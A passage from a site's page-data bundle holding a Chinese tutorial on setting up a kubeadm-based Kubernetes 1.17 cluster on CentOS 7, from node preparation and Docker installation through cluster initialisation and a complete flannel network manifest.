的运行环境\n\n",charsets:{cjk:!0}},{title:"kubernetes(二) 集群环境搭建",frontmatter:{title:"kubernetes(二) 集群环境搭建",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/601",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/601.kubernetes(%E4%BA%8C)%20%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html",relativePath:"01.运维/60.Kubernetes/601.kubernetes(二) 集群环境搭建.md",key:"v-7d7d4816",path:"/kubernetes/601/",headers:[{level:2,title:"1 前置知识点",slug:"_1-前置知识点",normalizedTitle:"1 前置知识点",charIndex:2},{level:3,title:"1.2 安装方式",slug:"_1-2-安装方式",normalizedTitle:"1.2 安装方式",charIndex:158},{level:3,title:"1.3 kubeadm 部署方式介绍",slug:"_1-3-kubeadm-部署方式介绍",normalizedTitle:"1.3 kubeadm 部署方式介绍",charIndex:370},{level:3,title:"1.4 安装要求",slug:"_1-4-安装要求",normalizedTitle:"1.4 安装要求",charIndex:590},{level:3,title:"1.5 最终目标",slug:"_1-5-最终目标",normalizedTitle:"1.5 最终目标",charIndex:770},{level:2,title:"2 安装部署",slug:"_2-安装部署",normalizedTitle:"2 安装部署",charIndex:935},{level:3,title:"2.1 hostname及解析",slug:"_2-1-hostname及解析",normalizedTitle:"2.1 hostname 及解析",charIndex:1237},{level:3,title:"2.2 时间同步",slug:"_2-2-时间同步",normalizedTitle:"2.2 时间同步",charIndex:1537},{level:3,title:"2.3 禁用iptables 和 firewalld 服务",slug:"_2-3-禁用iptables-和-firewalld-服务",normalizedTitle:"2.3 禁用 iptables 和 firewalld 服务",charIndex:1763},{level:3,title:"2.4 禁用 selinux",slug:"_2-4-禁用-selinux",normalizedTitle:"2.4 禁用 selinux",charIndex:2048},{level:3,title:"2.5 禁swap用分区",slug:"_2-5-禁swap用分区",normalizedTitle:"2.5 禁 swap 用分区",charIndex:2197},{level:3,title:"2.6 修改linxu的内核参数",slug:"_2-6-修改linxu的内核参数",normalizedTitle:"2.6 修改 linxu 的内核参数",charIndex:2526},{level:3,title:"2.7 配置 ipvs",slug:"_2-7-配置-ipvs",normalizedTitle:"2.7 配置 ipvs",charIndex:3153},{level:3,title:"2.8 docker 安装",slug:"_2-8-docker-安装",normalizedTitle:"2.8 docker 安装",charIndex:3786},{level:3,title:"2.9 安装kubernetes组件",slug:"_2-9-安装kubernetes组件",normalizedTitle:"2.9 安装 kubernetes 组件",charIndex:4703},{level:3,title:"2.10 集群初始化",slug:"_2-10-集群初始化",normalizedTitle:"2.10 集群初始化",charIndex:5281},{level:4,title:"准备镜像",slug:"准备镜像",normalizedTitle:"准备镜像",charIndex:5295},{level:4,title:"初始化",slug:"初始化",normalizedTitle:"初始化",charIndex:5288},{level:3,title:"2.11 安装网络插件",slug:"_2-11-安装网络插件",normalizedTitle:"2.11 安装网络插件",charIndex:6784},{level:4,title:"master 操作",slug:"master-操作",normalizedTitle:"master 操作",charIndex:6869},{level:2,title:"服务部署",slug:"服务部署",normalizedTitle:"服务部署",charIndex:23743}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"1 前置知识点 1.2 安装方式 1.3 kubeadm 部署方式介绍 1.4 安装要求 1.5 最终目标 2 安装部署 2.1 hostname及解析 2.2 时间同步 2.3 禁用iptables 和 firewalld 服务 2.4 禁用 selinux 2.5 禁swap用分区 2.6 修改linxu的内核参数 2.7 配置 ipvs 2.8 docker 安装 2.9 安装kubernetes组件 2.10 集群初始化 准备镜像 初始化 2.11 安装网络插件 master 操作 服务部署",content:'# 1 前置知识点\n\nKubernetes 集群大体上分为两类：一主多从 和 多主多从。\n\n * 一主多从：一台 Mater 节点和多台 Node 节点，搭建简单，但是由单机故障风险，适合用于测试环境\n * 多主多从：多台 Master 节点和多台 Node 节点，搭建麻烦，安全性高，适用于生产环境。\n\n\n\n\n# 1.2 安装方式\n\nKubernetes 多有多种部署方式，目前主流的方式由 kubeadm、minikube、二进制包\n\n * minikube：一个用于快速搭建单节点 kubernetes 的工具\n * kubeadm：一个用快速搭建 kubernetes 集群的工具\n * 二进制包：从官网下载每个组件的二进制包，以此去安装，此方式对于理解 kubernetes 组件更加有效\n\n> 新手推荐 kubeadm\n\n\n# 1.3 kubeadm 部署方式介绍\n\nkubeadm 是官方社区推出的一个用于快速部署 kubernetes 集群的工具，这个工具能通过两条指令完成一个 kubernetes 集群的部署：\n\n * 创建一个 Master 节点 kubeadm init\n * 将 Node 节点加入到当前集群中 $ kubeadm join <Master 节点的 IP 和端口>\n\n> kubeadm 安装集群要求 centos7.5 及以上\n\n\n# 1.4 安装要求\n\n在开始之前，部署 Kubernetes 集群机器需要满足以下几个条件：\n\n * 一台或多台机器，操作系统 CentOS7.x-86_x64\n * 硬件配置：2GB 或更多 RAM，2 个 CPU 或更多 CPU，硬盘 30GB 或更多\n * 集群中所有机器之间网络互通\n * 可以访问外网，需要拉取镜像\n * 禁止 swap 分区\n\n\n# 1.5 最终目标\n\n * 在所有节点上安装 Docker 和 kubeadm\n * 部署 Kubernetes Master\n * 部署容器网络插件\n * 部署 Kubernetes Node，将节点加入 Kubernetes 集群中\n * 部署 Dashboard Web 页面，可视化查看 Kubernetes 资源\n\n\n# 2 安装部署\n\n\n\n角色       HOSTNAME   IP               组件\nmaster   node101    192.168.81.101   docker，kubectl，kubeadm，kubelet\nnode1    node102    192.168.81.102   docker，kubectl，kubeadm，kubelet\nnode2    node103    192.168.81.103   docker，kubectl，kubeadm，kubelet\n\n> 以下没有特定说明在 Master 还是 Node 上操作，默认全部节点需要操作。\n\n\n# 2.1 hostname 及解析\n\n不管搭建设什么集群，切记设置好 hostname，比较方便。两个步骤完成设置：\n\n 1. 临时设置。hostname 节点名称\n 2. vim /etc/hostname\n\n设置完成后要添加解析 hostname 主机名的 IP 映射，vim /etc/hosts 直接修改\n\n192.168.81.101  node101\n192.168.81.102  node102\n192.168.81.103  node103  \n\n\n1\n2\n3\n\n\nhostname node101\n\nvim /etc/hostname\nnode101\n\n\n1\n2\n3\n4\n\n\n\n# 2.2 时间同步\n\nKubernetes 要求据群众的节点时间必须精确一致，这里直接使用 chronyd 服务从网络同步时间。企业中建议配置内部的时间同步服务器。\n\n# 启动chronyd服务\nsystemctl start chronyd\n# 设置chronyd服务开机自启动\nsystemctl enable chronyd\n# chronyd 服务启动稍等几秒钟，就可以使用data命令验证时间了\ndate\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.3 禁用 iptables 和 firewalld 服务\n\nKubernetes 和 docker 在运行中会产生大量的 iptables 规则，为了不让系统规则跟他们混淆，直接关闭系统的规则，生产系统建议开启，需要开放哪些端口或者 IP，手动配置。\n\n# 关闭 firewalld 服务\nsystemctl stop firewalld\nsystemctl disable firewalld\n# 关闭iptanles服务\nsystemctl stop iptables\nsystemctl disable iptables\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 2.4 禁用 selinux\n\nselinux 是 linux 系统下的一个安全服务，如果不关闭它，在安装集群中可能会被限制\n\n# 临时关闭\nsetenforce 0\n# 永久禁用\nvim /etc/selinux/config\nSELINUX=disabled\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.5 禁 swap 用分区\n\nswap 分区指的是虚拟内存分区，它的作用是在物理内存使用完之后，将磁盘空间虚拟成内存来使用，启用 swap 设备会对系统的性能产生非常负面的影响，因此 Kubernetes 要求每个节点都要禁用 swap 设备，但是如果因为某些原因确实不能关闭 swap 分区，就需要在集群安装的过程中通过明确的参数进行配置说明。\n\n# 临时关闭\nswapoff -a\n\n# 永久关闭，编辑分区配置文件 /etc/fstab，注释掉 wap 分区一行\n#/dev/mapper/centos-swap swap                    swap    defaults        0 0\n\n\n1\n2\n3\n4\n5\n\n\n\n# 2.6 修改 linxu 的内核参数\n\n# 修改linux的内核参数，添加网桥过滤和地址转发功能\n# 编辑 /etc/sysctl.d/k8s.conf 文件，添加如下配置：\nnet.bridge.bridge-nf-call-iptables=1\nnet.bridge.bridge-nf-call-ip6tables=1\nnet.ipv4.ip_forward=1\nnet.ipv4.tcp_tw_recycle=0\nvm.swappiness=0\nvm.overcommit_memory=1\nvm.panic_on_oom=0\nfs.inotify.max_user_watches=89100\nfs.file-max=52706963\nfs.nr_open=52706963\nnet.ipv6.conf.all.disable_ipv6=1\nnet.netfilter.nf_conntrack_max=2310720\n\n# 加载网桥过滤模块\nmodprobe br_netfilter\nmodprobe ip_conntrack\n# 配置完成后重新加载配置文件\nsysctl -p /etc/sysctl.d/k8s.conf\n# 查看网桥过滤模块是否添加成功\nlsmod | grep br_netfilter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.7 配置 ipvs\n\n在 Kubernetes 中 service 有两种代理模型，一种是基于 iptables 的，一种是基于 ipvs 的，两者比较的话，ipvs 的性能明显更要高一些，但是如果要使用它，需要手动载入 ipvs 模块\n\n# 安装 ipset 和 ipvsadm \nyum install ipset ipvsadm -y\n\n# 添加需要加载得模块写入脚本文件\ncat <<EOF > /etc/sysconfig/modules/ipvs.modules\n#!/bin/bash\nmodprobe -- ip_vs\nmodprobe -- ip_vs_rr\nmodprobe -- ip_vs_wrr\nmodprobe -- ip_vs_sh\nmodprobe -- nf_conntrack_ipv4\nmodprobe -- br_netfilter\nEOF\n\n# 为脚本文件添加执行权限\nchmod +x /etc/sysconfig/modules/ipvs.modules\n\n# 执行脚本文件\n/bin/bash /etc/sysconfig/modules/ipvs.modules\n\n# 查看对应得模块是否加载成功\nlsmod | grep -e ip_vs -e nf_conntrack_ipv4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 2.8 docker 安装\n\n# 之前安装过docker 卸载\nyum remove docker-*\n\n# 更换镜像地址\nwget https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo -O /etc/yum.repos.d/docker-ce.repo\n\n# 检查支持版本\nyum list docker-ce --showduplicates | sort -r\n\n# 安装\nyum install --setopt=obsoletes=0 docker-ce-18.06.3.ce-3.el7\n\n# 添加一个配置文件，docker在默认情况下使用的Cgroup Driver为cgroupfs，而kubernetes推荐使用systemd来代替cgroupfs\ncat > /etc/docker/daemon.json <<EOF\n{\n  "registry-mirrors": ["https://bk6kzfqm.mirror.aliyuncs.com"],\n  "data-root": "/data/docker",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "log-driver": "json-file",\n  "log-opts": {\n    "max-size": "100m"\n  },\n  "storage-driver": "overlay2",\n  "storage-opts": [\n    "overlay2.override_kernel_check=true"\n  ]\n}\nEOF\n\n# 启动docker\nsystemctl restart docker\nsystemctl enable docker\n\n#检查版本\ndocker version\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 2.9 安装 kubernetes 组件\n\n由于 Kubernetes 的镜像源在国外，速度比较慢，这里切换成国内的镜像源\n\n# 添加配置文件\nvim /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n安装 kubeadm、kubelet 和 kubectl\n\nyum install --setopt=obsoletes=0 kubeadm-1.17.4-0 kubelet-1.17.4-0 kubectl-1.17.4-0\n\n\n1\n\n\n设置 kubelet 开机自启动\n\nsystemctl enable kubelet\n\n\n1\n\n\n\n# 2.10 集群初始化\n\n# 准备镜像\n\nkubeadm config images list\n\nimages=(\n    kube-apiserver:v1.17.4\n    kube-controller-manager:v1.17.4\n    kube-scheduler:v1.17.4\n    kube-proxy:v1.17.4\n    pause:3.1\n    etcd:3.4.3-0\n    coredns:1.6.5\n)\n\n\nfor imageName in ${images[@]} ;do\n    docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName\n    docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName k8s.gcr.io/$imageName\n    docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName\ndone\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 初始化\n\n在 Master 点操作如下\n\nkubeadm init \\\n  --kubernetes-version=v1.17.4 \\\n  --pod-network-cidr=10.244.0.0/16 \\\n  --service-cidr=10.96.0.0/12  \\\n  --apiserver-advertise-address=10.240.30.113\n\n\n1\n2\n3\n4\n5\n\n * kubernetes-version 为版本\n * pod-network-cidr 指定 pod 网络\n * service-cidr 指定 service 网络\n * apiserver-advertise-address 指定 master 的 IP 地址\n * image-repository registry.aliyuncs.com/google_containers 指定镜像源为阿里，前面已经拉取过镜像了，所以不需要在拉\n\n# 安装过程中报错如果报错，查看日志\njournalctl -xfeu kubelet\n\n# 重置 kubeadm 的信息\nkubeadm reset\n\n\n1\n2\n3\n4\n5\n\n\n在 Master 点创建必要的文件，是 kubectl 以后要执行的配置文件\n\n  mkdir -p $HOME/.kube\n  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\n  sudo chown $(id -u):$(id -g) $HOME/.kube/config\n\n\n1\n2\n3\n\n\n其他子节点执行，安装成功后会有信息告诉你\n\nkubeadm join 192.168.81.101:6443 --token d5ejth.9s60snjt5xlh9lnt \\\n    --discovery-token-ca-cert-hash sha256:04aab4993001f66f607e959b120294eddcc8579a5ea7d7364f48d84caecc90c9\n\n\n1\n2\n\n\n查看所有节点\n\nkubectl get nodes\n\n\n1\n\n\n\n# 2.11 安装网络插件\n\nkubernetes 支持多种网络插件，比如 flannel、calico、canal 等等，任选一种使用即可，本次选择 flannel\n\n# master 操作\n\n创建文件，复制执内容到文件中\n\ncat <<EOF > kube-flannel.yml\n---\napiVersion: policy/v1beta1\nkind: PodSecurityPolicy\nmetadata:\n  name: psp.flannel.unprivileged\n  annotations:\n    seccomp.security.alpha.kubernetes.io/allowedProfileNames: docker/default\n    seccomp.security.alpha.kubernetes.io/defaultProfileName: docker/default\n    apparmor.security.beta.kubernetes.io/allowedProfileNames: runtime/default\n    apparmor.security.beta.kubernetes.io/defaultProfileName: runtime/default\nspec:\n  privileged: false\n  volumes:\n    - configMap\n    - secret\n    - emptyDir\n    - hostPath\n  allowedHostPaths:\n    - pathPrefix: "/etc/cni/net.d"\n    - pathPrefix: "/etc/kube-flannel"\n    - pathPrefix: "/run/flannel"\n  readOnlyRootFilesystem: false\n  # Users and groups\n  runAsUser:\n    rule: RunAsAny\n  supplementalGroups:\n    rule: RunAsAny\n  fsGroup:\n    rule: RunAsAny\n  # Privilege Escalation\n  allowPrivilegeEscalation: false\n  defaultAllowPrivilegeEscalation: false\n  # Capabilities\n  allowedCapabilities: [\'NET_ADMIN\']\n  defaultAddCapabilities: []\n  requiredDropCapabilities: []\n  # Host namespaces\n  hostPID: false\n  hostIPC: false\n  hostNetwork: true\n  hostPorts:\n  - min: 0\n    max: 65535\n  # SELinux\n  seLinux:\n    # SELinux is unused in CaaSP\n    rule: \'RunAsAny\'\n---\nkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nrules:\n  - apiGroups: [\'extensions\']\n    resources: [\'podsecuritypolicies\']\n    verbs: [\'use\']\n    resourceNames: [\'psp.flannel.unprivileged\']\n  - apiGroups:\n      - ""\n    resources:\n      - pods\n    verbs:\n      - get\n  - apiGroups:\n      - ""\n    resources:\n      - nodes\n    verbs:\n      - list\n      - watch\n  - apiGroups:\n      - ""\n    resources:\n      - nodes/status\n    verbs:\n      - patch\n---\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: flannel\nsubjects:\n- kind: ServiceAccount\n  name: flannel\n  namespace: kube-system\n---\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: flannel\n  namespace: kube-system\n---\nkind: ConfigMap\napiVersion: v1\nmetadata:\n  name: kube-flannel-cfg\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\ndata:\n  cni-conf.json: |\n    {\n      "name": "cbr0",\n      "cniVersion": "0.3.1",\n      "plugins": [\n        {\n          "type": "flannel",\n          "delegate": {\n            "hairpinMode": true,\n            "isDefaultGateway": true\n          }\n        },\n        {\n          "type": "portmap",\n          "capabilities": {\n            "portMappings": true\n          }\n        }\n      ]\n    }\n  net-conf.json: |\n    {\n      "Network": "10.244.0.0/16",\n      "Backend": {\n        "Type": "vxlan"\n      }\n    }\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - amd64\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n            add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-arm64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - arm64\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-arm\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - arm\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-ppc64le\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - ppc64le\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\n---\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: kube-flannel-ds-s390x\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchLabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n              - matchExpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: In\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: In\n                    values:\n                      - s390x\n      hostNetwork: true\n      tolerations:\n      - operator: Exists\n        effect: NoSchedule\n      serviceAccountName: flannel\n      initContainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumeMounts:\n        - name: cni\n          mountPath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50Mi"\n          limits:\n            cpu: "100m"\n            memory: "50Mi"\n        securityContext:\n          privileged: false\n          capabilities:\n             add: ["NET_ADMIN"]\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: run\n          mountPath: /run/flannel\n        - name: flannel-cfg\n          mountPath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostPath:\n            path: /run/flannel\n        - name: cni\n          hostPath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configMap:\n            name: kube-flannel-cfg\nEOF\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n305\n306\n307\n308\n309\n310\n311\n312\n313\n314\n315\n316\n317\n318\n319\n320\n321\n322\n323\n324\n325\n326\n327\n328\n329\n330\n331\n332\n333\n334\n335\n336\n337\n338\n339\n340\n341\n342\n343\n344\n345\n346\n347\n348\n349\n350\n351\n352\n353\n354\n355\n356\n357\n358\n359\n360\n361\n362\n363\n364\n365\n366\n367\n368\n369\n370\n371\n372\n373\n374\n375\n376\n377\n378\n379\n380\n381\n382\n383\n384\n385\n386\n387\n388\n389\n390\n391\n392\n393\n394\n395\n396\n397\n398\n399\n400\n401\n402\n403\n404\n405\n406\n407\n408\n409\n410\n411\n412\n413\n414\n415\n416\n417\n418\n419\n420\n421\n422\n423\n424\n425\n426\n427\n428\n429\n430\n431\n432\n433\n434\n435\n436\n437\n438\n439\n440\n441\n442\n443\n444\n445\n446\n447\n448\n449\n450